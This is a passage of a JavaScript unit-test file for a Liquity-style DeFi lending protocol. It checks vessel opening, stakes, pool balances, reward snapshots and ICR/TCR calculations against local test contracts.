			const VUSDRequestERC20 = MIN_NET_DEBT_ERC20
			await borrowerOperations.openVessel(erc20.address, dec(100, "ether"), MIN_NET_DEBT_ERC20, carol, carol, {
				from: alice,
			})

			// Get the expected debt based on the VUSD request (adding fee and liq. reserve on top)

			const expectedDebt_Asset = VUSDRequestERC20.add(
				await vesselManager.getBorrowingFee(erc20.address, VUSDRequestERC20)
			).add(VUSD_GAS_COMPENSATION_ERC20)

			const debt_After_Asset = await getVesselEntireDebt(alice, erc20.address)
			const coll_After_Asset = await getVesselEntireColl(alice, erc20.address)
			const status_After_Asset = await vesselManager.getVesselStatus(erc20.address, alice)

			// check coll and debt after

			assert.isTrue(coll_After_Asset.gt("0"))
			assert.isTrue(debt_After_Asset.gt("0"))
			assert.isTrue(debt_After_Asset.eq(expectedDebt_Asset))

			// check active status

			assert.equal(status_After_Asset, 1)
		})

		it("openVessel(): adds Vessel owner to VesselOwners array", async () => {
			const VesselOwnersCount_Before_Asset = (await vesselManager.getVesselOwnersCount(erc20.address)).toString()
			assert.equal(VesselOwnersCount_Before_Asset, "0")

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(15, 17)),
				extraParams: { from: alice },
			})

			const VesselOwnersCount_After_Asset = (await vesselManager.getVesselOwnersCount(erc20.address)).toString()

			assert.equal(VesselOwnersCount_After_Asset, "1")
		})

		it("openVessel(): creates a stake and adds it to total stakes", async () => {
			const aliceStakeBefore_Asset = await getVesselStake(alice, erc20.address)
			const totalStakesBefore_Asset = await vesselManager.totalStakes(erc20.address)

			assert.equal(aliceStakeBefore_Asset, "0")
			assert.equal(totalStakesBefore_Asset, "0")

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const aliceCollAfter_Asset = await getVesselEntireColl(alice, erc20.address)
			const aliceStakeAfter_Asset = await getVesselStake(alice, erc20.address)

			assert.isTrue(aliceCollAfter_Asset.gt(toBN("0")))
			assert.isTrue(aliceStakeAfter_Asset.eq(aliceCollAfter_Asset))

			const totalStakesAfter_Asset = await vesselManager.totalStakes(erc20.address)

			assert.isTrue(totalStakesAfter_Asset.eq(aliceStakeAfter_Asset))
		})

		it("openVessel(): inserts Vessel to Sorted Vessels list", async () => {
			// Check before

			const aliceVesselInList_Before_Asset = await sortedVessels.contains(erc20.address, alice)
			const listIsEmpty_Before_Asset = await sortedVessels.isEmpty(erc20.address)

			assert.equal(aliceVesselInList_Before_Asset, false)
			assert.equal(listIsEmpty_Before_Asset, true)

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			// check after

			const aliceVesselInList_After_Asset = await sortedVessels.contains(erc20.address, alice)
			const listIsEmpty_After_Asset = await sortedVessels.isEmpty(erc20.address)

			assert.equal(aliceVesselInList_After_Asset, true)
			assert.equal(listIsEmpty_After_Asset, false)
		})

		it("openVessel(): Increases the activePool ETH and raw ether balance by correct amount", async () => {
			const activePool_ETH_Before_Asset = await activePool.getAssetBalance(erc20.address)
			const activePool_RawEther_Before_Asset = await erc20.balanceOf(activePool.address)

			assert.equal(activePool_ETH_Before_Asset, 0)
			assert.equal(activePool_RawEther_Before_Asset, 0)

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const aliceCollAfter_Asset = await getVesselEntireColl(alice, erc20.address)

			const activePool_ETH_After_Asset = await activePool.getAssetBalance(erc20.address)
			const activePool_RawEther_After_Asset = toBN(await erc20.balanceOf(activePool.address))

			assert.isTrue(activePool_ETH_After_Asset.eq(aliceCollAfter_Asset))
			assert.isTrue(activePool_RawEther_After_Asset.eq(aliceCollAfter_Asset))
		})

		it("openVessel(): records up-to-date initial snapshots of L_ETH and L_VUSDDebt", async () => {
			// --- SETUP ---

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: carol },
			})

			// --- TEST ---

			// price drops to 1ETH:100VUSD, reducing Carol's ICR below MCR
			await priceFeed.setPrice(erc20.address, dec(100, 18))

			// close Carol's Vessel, liquidating her 1 ether and 180VUSD.
			await vesselManagerOperations.liquidate(erc20.address, carol, { from: owner })

			/* with total stakes = 10 ether, after liquidation, L_ETH should equal 1/10 ether per-ether-staked,
       and L_VUSD should equal 18 VUSD per-ether-staked. */

			const L_Asset = await vesselManager.L_Colls(erc20.address)
			const L_VUSD_Asset = await vesselManager.L_Debts(erc20.address)

			assert.isTrue(L_Asset.gt(toBN("0")))
			assert.isTrue(L_VUSD_Asset.gt(toBN("0")))

			// Bob opens vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			// Check Bob's snapshots of L_ETH and L_VUSD equal the respective current values

			const bob_rewardSnapshot_Asset = await vesselManager.rewardSnapshots(bob, erc20.address)
			const bob_ETHrewardSnapshot_Asset = bob_rewardSnapshot_Asset[0]
			const bob_VUSDDebtRewardSnapshot_Asset = bob_rewardSnapshot_Asset[1]

			assert.isAtMost(th.getDifference(bob_ETHrewardSnapshot_Asset, L_Asset), 1000)
			assert.isAtMost(th.getDifference(bob_VUSDDebtRewardSnapshot_Asset, L_VUSD_Asset), 1000)
		})

		it("openVessel(): allows a user to open a Vessel, then close it, then re-open it", async () => {
			// Open Vessels
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: carol },
			})

			// Check Vessel is active

			const alice_Vessel_1_Asset = await vesselManager.Vessels(alice, erc20.address)
			const status_1_Asset = alice_Vessel_1_Asset[th.VESSEL_STATUS_INDEX]
			assert.equal(status_1_Asset, 1)
			assert.isTrue(await sortedVessels.contains(erc20.address, alice))

			// to compensate borrowing fees
			await debtToken.transfer(alice, dec(10000, 18), { from: whale })
			await borrowerOperations.closeVessel(erc20.address, { from: alice })

			// Check Vessel is closed

			const alice_Vessel_2_Asset = await vesselManager.Vessels(alice, erc20.address)
			const status_2_Asset = alice_Vessel_2_Asset[th.VESSEL_STATUS_INDEX]
			assert.equal(status_2_Asset, 2)
			assert.isFalse(await sortedVessels.contains(erc20.address, alice))

			// Re-open Vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			// Check Vessel is re-opened

			const alice_Vessel_3_Asset = await vesselManager.Vessels(alice, erc20.address)
			const status_3_Asset = alice_Vessel_3_Asset[th.VESSEL_STATUS_INDEX]
			assert.equal(status_3_Asset, 1)
			assert.isTrue(await sortedVessels.contains(erc20.address, alice))
		})

		it("openVessel(): increases the Vessel's VUSD debt by the correct amount", async () => {
			// check before

			const alice_Vessel_Before_Asset = await vesselManager.Vessels(alice, erc20.address)
			const debt_Before_Asset = alice_Vessel_Before_Asset[th.VESSEL_DEBT_INDEX]
			assert.equal(debt_Before_Asset, 0)

			await borrowerOperations.openVessel(
				erc20.address,
				dec(100, "ether"),
				await getOpenVesselVUSDAmount(dec(10000, 18), erc20.address),
				alice,
				alice,
				{ from: alice }
			)

			// check after

			const alice_Vessel_After_Asset = await vesselManager.Vessels(alice, erc20.address)
			const debt_After_Asset = alice_Vessel_After_Asset[th.VESSEL_DEBT_INDEX]
			th.assertIsApproximatelyEqual(debt_After_Asset, dec(10000, 18), 10000)
		})

		it("openVessel(): increases VUSD debt in ActivePool by the debt of the vessel", async () => {
			const activePooL_VUSDDebt_Before_Asset = await activePool.getDebtTokenBalance(erc20.address)

			assert.equal(activePooL_VUSDDebt_Before_Asset, 0)

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const aliceDebt_Asset = await getVesselEntireDebt(alice, erc20.address)
			assert.isTrue(aliceDebt_Asset.gt(toBN("0")))

			const activePooL_VUSDDebt_After_Asset = await activePool.getDebtTokenBalance(erc20.address)

			assert.isTrue(activePooL_VUSDDebt_After_Asset.eq(aliceDebt_Asset))
		})

		it("openVessel(): increases user debtToken balance by correct amount", async () => {
			// check before
			const alice_debtTokenBalance_Before = await debtToken.balanceOf(alice)
			assert.equal(alice_debtTokenBalance_Before, 0)
			const vesselColl = dec(100, "ether")

			await borrowerOperations.openVessel(erc20.address, vesselColl, dec(10000, 18), alice, alice, { from: alice })

			// check after
			const alice_debtTokenBalance_After = await debtToken.balanceOf(alice)
			assert.equal(alice_debtTokenBalance_After, dec(10000, 18))
		})

		//  --- getNewICRFromVesselChange - (external wrapper in Tester contract calls internal function) ---

		describe("getNewICRFromVesselChange() returns the correct ICR", async () => {
			// 0, 0
			it("collChange = 0, debtChange = 0", async () => {
				price = await priceFeed.getPrice(erc20.address)
				const initialColl = dec(1, "ether")
				const initialDebt = dec(100, 18)
				const collChange = 0
				const debtChange = 0

				const newICR = (
					await borrowerOperations.getNewICRFromVesselChange(
						initialColl,
						initialDebt,
						collChange,
						true,
						debtChange,
						true,
						price
					)
				).toString()
				assert.equal(newICR, "2000000000000000000")
			})

			// 0, +ve
			it("collChange = 0, debtChange is positive", async () => {
				price = await priceFeed.getPrice(erc20.address)
				const initialColl = dec(1, "ether")
				const initialDebt = dec(100, 18)
				const collChange = 0
				const debtChange = dec(50, 18)

				const newICR = (
					await borrowerOperations.getNewICRFromVesselChange(
						initialColl,
						initialDebt,
						collChange,
						true,
						debtChange,
						true,
						price
					)
				).toString()
				assert.isAtMost(th.getDifference(newICR, "1333333333333333333"), 100)
			})

			// 0, -ve
			it("collChange = 0, debtChange is negative", async () => {
				price = await priceFeed.getPrice(erc20.address)
				const initialColl = dec(1, "ether")
				const initialDebt = dec(100, 18)
				const collChange = 0
				const debtChange = dec(50, 18)

				const newICR = (
					await borrowerOperations.getNewICRFromVesselChange(
						initialColl,
						initialDebt,
						collChange,
						true,
						debtChange,
						false,
						price
					)
				).toString()
				assert.equal(newICR, "4000000000000000000")
			})

			// +ve, 0
			it("collChange is positive, debtChange is 0", async () => {
				price = await priceFeed.getPrice(erc20.address)
				const initialColl = dec(1, "ether")
				const initialDebt = dec(100, 18)
				const collChange = dec(1, "ether")
				const debtChange = 0

				const newICR = (
					await borrowerOperations.getNewICRFromVesselChange(
						initialColl,
						initialDebt,
						collChange,
						true,
						debtChange,
						true,
						price
					)
				).toString()
				assert.equal(newICR, "4000000000000000000")
			})

			// -ve, 0
			it("collChange is negative, debtChange is 0", async () => {
				price = await priceFeed.getPrice(erc20.address)
				const initialColl = dec(1, "ether")
				const initialDebt = dec(100, 18)
				const collChange = dec(5, 17)
				const debtChange = 0

				const newICR = (
					await borrowerOperations.getNewICRFromVesselChange(
						initialColl,
						initialDebt,
						collChange,
						false,
						debtChange,
						true,
						price
					)
				).toString()
				assert.equal(newICR, "1000000000000000000")
			})

			// -ve, -ve
			it("collChange is negative, debtChange is negative", async () => {
				price = await priceFeed.getPrice(erc20.address)
				const initialColl = dec(1, "ether")
				const initialDebt = dec(100, 18)
				const collChange = dec(5, 17)
				const debtChange = dec(50, 18)

				const newICR = (
					await borrowerOperations.getNewICRFromVesselChange(
						initialColl,
						initialDebt,
						collChange,
						false,
						debtChange,
						false,
						price
					)
				).toString()
				assert.equal(newICR, "2000000000000000000")
			})

			// +ve, +ve
			it("collChange is positive, debtChange is positive", async () => {
				price = await priceFeed.getPrice(erc20.address)
				const initialColl = dec(1, "ether")
				const initialDebt = dec(100, 18)
				const collChange = dec(1, "ether")
				const debtChange = dec(100, 18)

				const newICR = (
					await borrowerOperations.getNewICRFromVesselChange(
						initialColl,
						initialDebt,
						collChange,
						true,
						debtChange,
						true,
						price
					)
				).toString()
				assert.equal(newICR, "2000000000000000000")
			})

			// +ve, -ve
			it("collChange is positive, debtChange is negative", async () => {
				price = await priceFeed.getPrice(erc20.address)
				const initialColl = dec(1, "ether")
				const initialDebt = dec(100, 18)
				const collChange = dec(1, "ether")
				const debtChange = dec(50, 18)

				const newICR = (
					await borrowerOperations.getNewICRFromVesselChange(
						initialColl,
						initialDebt,
						collChange,
						true,
						debtChange,
						false,
						price
					)
				).toString()
				assert.equal(newICR, "8000000000000000000")
			})

			// -ve, +ve
			it("collChange is negative, debtChange is positive", async () => {
				price = await priceFeed.getPrice(erc20.address)
				const initialColl = dec(1, "ether")
				const initialDebt = dec(100, 18)
				const collChange = dec(5, 17)
				const debtChange = dec(100, 18)

				const newICR = (
					await borrowerOperations.getNewICRFromVesselChange(
						initialColl,
						initialDebt,
						collChange,
						false,
						debtChange,
						true,
						price
					)
				).toString()
				assert.equal(newICR, "500000000000000000")
			})
		})

		// --- getCompositeDebt ---

		it("getCompositeDebt(): returns debt + gas comp", async () => {
			assert.equal(
				await borrowerOperations.getCompositeDebt(erc20.address, "0"),
				VUSD_GAS_COMPENSATION_ERC20.toString()
			)

			th.assertIsApproximatelyEqual(
				await borrowerOperations.getCompositeDebt(erc20.address, dec(90, 18)),
				VUSD_GAS_COMPENSATION_ERC20.add(toBN(dec(90, 18)))
			)
			th.assertIsApproximatelyEqual(
				await borrowerOperations.getCompositeDebt(erc20.address, dec(24423422357345049, 12)),
				VUSD_GAS_COMPENSATION_ERC20.add(toBN(dec(24423422357345049, 12)))
			)
		})

		//  --- getNewTCRFromVesselChange  - (external wrapper in Tester contract calls internal function) ---

		describe("getNewTCRFromVesselChange() returns the correct TCR", async () => {
			// 0, 0
			it("collChange = 0, debtChange = 0", async () => {
				// --- SETUP --- Create a Liquity instance with an Active Pool and pending rewards (Default Pool)
				const vesselColl = toBN(dec(1000, "ether"))
				const vesselTotalDebt = toBN(dec(100000, 18))
				const vesselVUSDAmount_Asset = await getOpenVesselVUSDAmount(vesselTotalDebt, erc20.address)

				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, alice, alice, {
					from: alice,
				})
				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, bob, bob, { from: bob })

				await priceFeed.setPrice(erc20.address, dec(100, 18))

				const liquidationTx_Asset = await vesselManagerOperations.liquidate(erc20.address, bob)
				assert.isFalse(await sortedVessels.contains(erc20.address, bob))

				const [liquidatedDebt_Asset, liquidatedColl_Asset] = th.getEmittedLiquidationValues(liquidationTx_Asset)

				await priceFeed.setPrice(erc20.address, dec(200, 18))
				const price = await priceFeed.getPrice(erc20.address)

				// --- TEST ---
				const collChange = 0
				const debtChange = 0
				const newTCR_Asset = await borrowerOperations.getNewTCRFromVesselChange(
					erc20.address,
					collChange,
					true,
					debtChange,
					true,
					price
				)

				const expectedTCR_Asset = vesselColl
					.add(liquidatedColl_Asset)
					.mul(price)
					.div(vesselTotalDebt.add(liquidatedDebt_Asset))

				assert.isTrue(newTCR_Asset.eq(expectedTCR_Asset))
			})

			// 0, +ve
			it("collChange = 0, debtChange is positive", async () => {
				// --- SETUP --- Create a Liquity instance with an Active Pool and pending rewards (Default Pool)
				const vesselColl = toBN(dec(1000, "ether"))
				const vesselTotalDebt = toBN(dec(100000, 18))
				const vesselVUSDAmount_Asset = await getOpenVesselVUSDAmount(vesselTotalDebt, erc20.address)

				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, alice, alice, {
					from: alice,
				})
				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, bob, bob, { from: bob })

				await priceFeed.setPrice(erc20.address, dec(100, 18))

				const liquidationTx_Asset = await vesselManagerOperations.liquidate(erc20.address, bob)
				assert.isFalse(await sortedVessels.contains(erc20.address, bob))

				const [liquidatedDebt_Asset, liquidatedColl_Asset] = th.getEmittedLiquidationValues(liquidationTx_Asset)

				await priceFeed.setPrice(erc20.address, dec(200, 18))
				const price = await priceFeed.getPrice(erc20.address)

				// --- TEST ---
				const collChange = 0
				const debtChange = dec(200, 18)
				const newTCR_Asset = await borrowerOperations.getNewTCRFromVesselChange(
					erc20.address,
					collChange,
					true,
					debtChange,
					true,
					price
				)

				const expectedTCR_Asset = vesselColl
					.add(liquidatedColl_Asset)
					.mul(price)
					.div(vesselTotalDebt.add(liquidatedDebt_Asset).add(toBN(debtChange)))

				assert.isTrue(newTCR_Asset.eq(expectedTCR_Asset))
			})

			// 0, -ve
			it("collChange = 0, debtChange is negative", async () => {
				// --- SETUP --- Create a Liquity instance with an Active Pool and pending rewards (Default Pool)
				const vesselColl = toBN(dec(1000, "ether"))
				const vesselTotalDebt = toBN(dec(100000, 18))
				const vesselVUSDAmount_Asset = await getOpenVesselVUSDAmount(vesselTotalDebt, erc20.address)

				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, alice, alice, {
					from: alice,
				})
				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, bob, bob, { from: bob })

				await priceFeed.setPrice(erc20.address, dec(100, 18))

				const liquidationTx_Asset = await vesselManagerOperations.liquidate(erc20.address, bob)

				assert.isFalse(await sortedVessels.contains(erc20.address, bob))

				const [liquidatedDebt_Asset, liquidatedColl_Asset] = th.getEmittedLiquidationValues(liquidationTx_Asset)

				await priceFeed.setPrice(erc20.address, dec(200, 18))
				const price = await priceFeed.getPrice(erc20.address)

				// --- TEST ---
				const collChange = 0
				const debtChange = dec(100, 18)
				const newTCR_Asset = await borrowerOperations.getNewTCRFromVesselChange(
					erc20.address,
					collChange,
					true,
					debtChange,
					false,
					price
				)

				const expectedTCR_Asset = vesselColl
					.add(liquidatedColl_Asset)
					.mul(price)
					.div(vesselTotalDebt.add(liquidatedDebt_Asset).sub(toBN(dec(100, 18))))

				assert.isTrue(newTCR_Asset.eq(expectedTCR_Asset))
			})

			// +ve, 0
			it("collChange is positive, debtChange is 0", async () => {
				// --- SETUP --- Create a Liquity instance with an Active Pool and pending rewards (Default Pool)
				const vesselColl = toBN(dec(1000, "ether"))
				const vesselTotalDebt = toBN(dec(100000, 18))
				const vesselVUSDAmount_Asset = await getOpenVesselVUSDAmount(vesselTotalDebt, erc20.address)

				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, alice, alice, {
					from: alice,
				})
				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, bob, bob, { from: bob })

				await priceFeed.setPrice(erc20.address, dec(100, 18))

				const liquidationTx_Asset = await vesselManagerOperations.liquidate(erc20.address, bob)

				assert.isFalse(await sortedVessels.contains(erc20.address, bob))

				const [liquidatedDebt_Asset, liquidatedColl_Asset] = th.getEmittedLiquidationValues(liquidationTx_Asset)

				await priceFeed.setPrice(erc20.address, dec(200, 18))
				const price = await priceFeed.getPrice(erc20.address)
				// --- TEST ---
				const collChange = dec(2, "ether")
				const debtChange = 0
				const newTCR_Asset = await borrowerOperations.getNewTCRFromVesselChange(
					erc20.address,
					collChange,
					true,
					debtChange,
					true,
					price
				)

				const expectedTCR_Asset = vesselColl
					.add(liquidatedColl_Asset)
					.add(toBN(collChange))
					.mul(price)
					.div(vesselTotalDebt.add(liquidatedDebt_Asset))

				assert.isTrue(newTCR_Asset.eq(expectedTCR_Asset))
			})

			// -ve, 0
			it("collChange is negative, debtChange is 0", async () => {
				// --- SETUP --- Create a Liquity instance with an Active Pool and pending rewards (Default Pool)
				const vesselColl = toBN(dec(1000, "ether"))
				const vesselTotalDebt = toBN(dec(100000, 18))
				const vesselVUSDAmount_Asset = await getOpenVesselVUSDAmount(vesselTotalDebt, erc20.address)

				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, alice, alice, {
					from: alice,
				})
				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, bob, bob, { from: bob })

				await priceFeed.setPrice(erc20.address, dec(100, 18))

				const liquidationTx_Asset = await vesselManagerOperations.liquidate(erc20.address, bob)

				assert.isFalse(await sortedVessels.contains(erc20.address, bob))

				const [liquidatedDebt_Asset, liquidatedColl_Asset, gasComp_Asset] =
					th.getEmittedLiquidationValues(liquidationTx_Asset)

				await priceFeed.setPrice(erc20.address, dec(200, 18))
				const price = await priceFeed.getPrice(erc20.address)

				// --- TEST ---
				const collChange = dec(1, 18)
				const debtChange = 0
				const newTCR_Asset = await borrowerOperations.getNewTCRFromVesselChange(
					erc20.address,
					collChange,
					false,
					debtChange,
					true,
					price
				)

				const expectedTCR_Asset = vesselColl
					.add(liquidatedColl_Asset)
					.sub(toBN(dec(1, "ether")))
					.mul(price)
					.div(vesselTotalDebt.add(liquidatedDebt_Asset))

				assert.isTrue(newTCR_Asset.eq(expectedTCR_Asset))
			})

			// -ve, -ve
			it("collChange is negative, debtChange is negative", async () => {
				// --- SETUP --- Create a Liquity instance with an Active Pool and pending rewards (Default Pool)
				const vesselColl = toBN(dec(1000, "ether"))
				const vesselTotalDebt = toBN(dec(100000, 18))
				const vesselVUSDAmount_Asset = await getOpenVesselVUSDAmount(vesselTotalDebt, erc20.address)

				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, alice, alice, {
					from: alice,
				})
				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, bob, bob, { from: bob })

				await priceFeed.setPrice(erc20.address, dec(100, 18))

				const liquidationTx_Asset = await vesselManagerOperations.liquidate(erc20.address, bob)

				assert.isFalse(await sortedVessels.contains(erc20.address, bob))

				const [liquidatedDebt_Asset, liquidatedColl_Asset, gasComp_Asset] =
					th.getEmittedLiquidationValues(liquidationTx_Asset)

				await priceFeed.setPrice(erc20.address, dec(200, 18))
				const price = await priceFeed.getPrice(erc20.address)

				// --- TEST ---
				const collChange = dec(1, 18)
				const debtChange = dec(100, 18)
				const newTCR_Asset = await borrowerOperations.getNewTCRFromVesselChange(
					erc20.address,
					collChange,
					false,
					debtChange,
					false,
					price
				)

				const expectedTCR_Asset = vesselColl
					.add(liquidatedColl_Asset)
					.sub(toBN(dec(1, "ether")))
					.mul(price)
					.div(vesselTotalDebt.add(liquidatedDebt_Asset).sub(toBN(dec(100, 18))))

				assert.isTrue(newTCR_Asset.eq(expectedTCR_Asset))
			})

			// +ve, +ve
			it("collChange is positive, debtChange is positive", async () => {
				// --- SETUP --- Create a Liquity instance with an Active Pool and pending rewards (Default Pool)
				const vesselColl = toBN(dec(1000, "ether"))
				const vesselTotalDebt = toBN(dec(100000, 18))
				const vesselVUSDAmount_Asset = await getOpenVesselVUSDAmount(vesselTotalDebt, erc20.address)

				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, alice, alice, {
					from: alice,
				})
				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, bob, bob, { from: bob })

				await priceFeed.setPrice(erc20.address, dec(100, 18))

				const liquidationTx_Asset = await vesselManagerOperations.liquidate(erc20.address, bob)

				assert.isFalse(await sortedVessels.contains(erc20.address, bob))

				const [liquidatedDebt_Asset, liquidatedColl_Asset] = th.getEmittedLiquidationValues(liquidationTx_Asset)

				await priceFeed.setPrice(erc20.address, dec(200, 18))
				const price = await priceFeed.getPrice(erc20.address)

				// --- TEST ---
				const collChange = dec(1, "ether")
				const debtChange = dec(100, 18)
				const newTCR_Asset = await borrowerOperations.getNewTCRFromVesselChange(
					erc20.address,
					collChange,
					true,
					debtChange,
					true,
					price
				)

				const expectedTCR_Asset = vesselColl
					.add(liquidatedColl_Asset)
					.add(toBN(dec(1, "ether")))
					.mul(price)
					.div(vesselTotalDebt.add(liquidatedDebt_Asset).add(toBN(dec(100, 18))))

				assert.isTrue(newTCR_Asset.eq(expectedTCR_Asset))
			})

			// +ve, -ve
			it("collChange is positive, debtChange is negative", async () => {
				// --- SETUP --- Create a Liquity instance with an Active Pool and pending rewards (Default Pool)
				const vesselColl = toBN(dec(1000, "ether"))
				const vesselTotalDebt = toBN(dec(100000, 18))
				const vesselVUSDAmount_Asset = await getOpenVesselVUSDAmount(vesselTotalDebt, erc20.address)

				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, alice, alice, {
					from: alice,
				})
				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, bob, bob, { from: bob })

				await priceFeed.setPrice(erc20.address, dec(100, 18))

				const liquidationTx_Asset = await vesselManagerOperations.liquidate(erc20.address, bob)

				assert.isFalse(await sortedVessels.contains(erc20.address, bob))

				const [liquidatedDebt_Asset, liquidatedColl_Asset] = th.getEmittedLiquidationValues(liquidationTx_Asset)

				await priceFeed.setPrice(erc20.address, dec(200, 18))
				const price = await priceFeed.getPrice(erc20.address)

				// --- TEST ---
				const collChange = dec(1, "ether")
				const debtChange = dec(100, 18)
				const newTCR_Asset = await borrowerOperations.getNewTCRFromVesselChange(
					erc20.address,
					collChange,
					true,
					debtChange,
					false,
					price
				)

				const expectedTCR_Asset = vesselColl
					.add(liquidatedColl_Asset)
					.add(toBN(dec(1, "ether")))
					.mul(price)
					.div(vesselTotalDebt.add(liquidatedDebt_Asset).sub(toBN(dec(100, 18))))

				assert.isTrue(newTCR_Asset.eq(expectedTCR_Asset))
			})

			// -ve, +ve
			it("collChange is negative, debtChange is positive", async () => {
				// --- SETUP --- Create a Liquity instance with an Active Pool and pending rewards (Default Pool)
				const vesselColl = toBN(dec(1000, "ether"))
				const vesselTotalDebt = toBN(dec(100000, 18))
				const vesselVUSDAmount_Asset = await getOpenVesselVUSDAmount(vesselTotalDebt, erc20.address)

				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, alice, alice, {
					from: alice,
				})
				await borrowerOperations.openVessel(erc20.address, vesselColl, vesselVUSDAmount_Asset, bob, bob, { from: bob })

				await priceFeed.setPrice(erc20.address, dec(100, 18))

				const liquidationTx_Asset = await vesselManagerOperations.liquidate(erc20.address, bob)

				assert.isFalse(await sortedVessels.contains(erc20.address, bob))

				const [liquidatedDebt_Asset, liquidatedColl_Asset] = th.getEmittedLiquidationValues(liquidationTx_Asset)

				await priceFeed.setPrice(erc20.address, dec(200, 18))
				const price = await priceFeed.getPrice(erc20.address)

				// --- TEST ---
				const collChange = dec(1, 18)
				const debtChange = await getNetBorrowingAmount(dec(200, 18), erc20.address)
				const newTCR_Asset = await borrowerOperations.getNewTCRFromVesselChange(
					erc20.address,
					collChange,
					false,
					debtChange,
					true,
					price
				)

				const expectedTCR_Asset = vesselColl
					.add(liquidatedColl_Asset)
					.sub(toBN(collChange))
					.mul(price)
					.div(vesselTotalDebt.add(liquidatedDebt_Asset).add(toBN(debtChange)))

				assert.isTrue(newTCR_Asset.eq(expectedTCR_Asset))
			})
		})

		// This shouldn't apply to our ERC20 collateral model
		/* if (!withProxy) {
			it("closeVessel(): fails if owner cannot receive ETH", async () => {
				const nonPayable = await NonPayable.new()
				const vesselColl = dec(1000, 18)
				// we need 2 vessels to be able to close 1 and have 1 remaining in the system
				await borrowerOperations.openVessel(
					erc20.address,
					vesselColl,
					dec(100000, 18),
					alice,
					alice,
					{ from: alice }
				)
				// Alice sends VUSD to NonPayable so its VUSD balance covers its debt
				await debtToken.transfer(nonPayable.address, dec(40000, 18), { from: alice })
				// open vessel from NonPayable proxy contract
				const _100pctHex = "0xde0b6b3a7640000"
				const _1e25Hex = "0xd3c21bcecceda1000000"
				const _10000Ether = "0x21e19e0c9bab2400000"
				const openVesselData_Asset = th.getTransactionData(
					"openVessel(address,uint256,uint256,uint256,address,address)",
					[erc20.address, _10000Ether, _100pctHex, _1e25Hex, "0x0", "0x0"]
				)
				await nonPayable.forward(borrowerOperations.address, openVesselData_Asset, {
					value: dec(10000, "ether"),
				})
				// await nonPayable.forward(borrowerOperations.address, openVesselData_Asset);
				// assert.equal((await vesselManager.getVesselStatus(erc20.address, nonPayable.address)).toString(), '1', 'NonPayable proxy should have a vessel')
				assert.isFalse(
					await th.checkRecoveryMode(contracts),
					"System should not be in Recovery Mode"
				)
				// assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address), 'System should not be in Recovery Mode')
				// open vessel from NonPayable proxy contract
				// const closeVesselData_Asset = th.getTransactionData('closeVessel(address)', [erc20.address])
				await th.assertRevert(
					nonPayable.forward(borrowerOperations.address, closeVesselData),
					"ActivePool: sending ETH failed"
				)
				// await th.assertRevert(nonPayable.forward(borrowerOperations.address, closeVesselData_Asset), 'ActivePool: sending ETH failed')
			})
		} */
	})
})

contract("Reset chain state", async accounts => {})

/* TODO:
 1) Test SortedList re-ordering by ICR. ICR ratio
 changes with addColl, withdrawColl, withdrawVUSD, withdrawVUSD, etc. Can split them up and put them with
 individual functions, or give ordering it's own 'describe' block.
 2)In security phase:
 -'Negative' tests for all the above functions.
 */
